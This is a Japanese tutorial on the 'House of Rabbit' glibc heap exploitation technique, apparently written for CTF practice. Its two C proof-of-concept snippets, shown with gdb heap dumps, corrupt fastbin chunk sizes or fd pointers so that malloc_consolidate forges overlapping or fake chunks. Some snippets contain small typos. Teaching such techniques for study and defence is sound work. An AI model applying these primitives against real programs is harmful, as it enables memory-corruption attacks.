# House of Rabbit

## はじめに
House of rabbit はヒープチャンクを偽造する手法で、早くも 2017 年に提唱されましたが、CTF の大会に現れたのはここ 2 か月ほどのことです。ほかの unsorted bin などの bin にはより優れた攻撃手段があるため、一般には fastbin attack で用います。

## 原理
fastbin では、解放された同じ size のチャンクが単方向リストで管理されており、確保のときに size が妥当かどうかが検査され、妥当でなければプログラムは異常終了します。house of rabbit は、malloc consolidate の際に fastbin のチャンクを統合するときに size が検査されないことを利用して、偽のチャンクを偽造し、さらなる攻撃の準備をします。

原作者の [POC](https://github.com/shift-crops/House_of_Rabbit) は必要な条件が多いため、ここでは直接この攻撃の本質を紹介します。

`前提条件`:
1. fastbin の fd ポインタまたは size を書き換えられる
2. malloc consolidate を発動できる(top との統合や、大きな chunk の malloc など)


POC を見てみましょう。
`POC 1`: modify the size of fastbin chunk
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x40); //0x602050
malloc(0x10);
free(chunk1);
free(chunk2);
/* Heap layout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
..... 
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x602000 --> 0x0 
0104| 0x602068 --> 0x0 
...... 
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x21 ('!')
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x0 
*/
chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1
malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate
/*Chunk1 overlap with chunk2 now
gdb-peda$ telescope 0x602000 100
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0xa1 
0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0032| 0x602020 --> 0x0 
.....
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0112| 0x602070 --> 0x0 
0120| 0x602078 --> 0x0 
....
0152| 0x602098 --> 0x0 
0160| 0x6020a0 --> 0xa0 
0168| 0x6020a8 --> 0x20 (' ')

gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603450 (size : 0x1fbb0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602050
(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )
*/
```
`POC 2`:modify FD pointer
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x100);//0x602050

chunk2[1]=0x31; //fake chunk size 0x30
chunk2[7]=0x21  //fake chunk's next chunk
chunk2[11]=0x21 //fake chunk's next chunk's next chuck
/* Heap laylout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
......
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x111 
0096| 0x602060 --> 0x0 
0104| 0x602068 --> 0x31 ('1')
0112| 0x602070 --> 0x0 
......
0144| 0x602090 --> 0x0 
0152| 0x602098 --> 0x21 ('!')
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x0 
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x21 ('!')
0192| 0x6020c0 --> 0x0 
......
0352| 0x602160 --> 0x0 
0360| 0x602168 --> 0x20ea1
*/
free(chunk1);
chuck1[0]=0x602060;// modify the fd of chunk1
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0
*/
malloc(5000);// malloc a  big chunk to trigger malloc consolidate
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6034f0 (size : 0x1fb10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602000
(0x030)  smallbin[ 1]: 0x602060
*/
```

原理は単純で、fastbin chunk の size を書き換えて(上の POC 1 のとおり)直接 overlap chunk を構築するか、fd を書き換えて(下の POC 2 のとおり)fake chunk を指すようにし、malloc consolidate を発動させた後に、その fake chunk を正当な chunk にするというものです。

## まとめ
House of rabbit の利点は overlap chunk を構築しやすいことで、fastbin attack をベースにできるため、リークなしでも攻撃を完了できることさえあります。例題で練習して、この攻撃への理解を深めてください。

## 例題
1. HITB-GSEC-XCTF 2018 mutepig
2. 追加予定
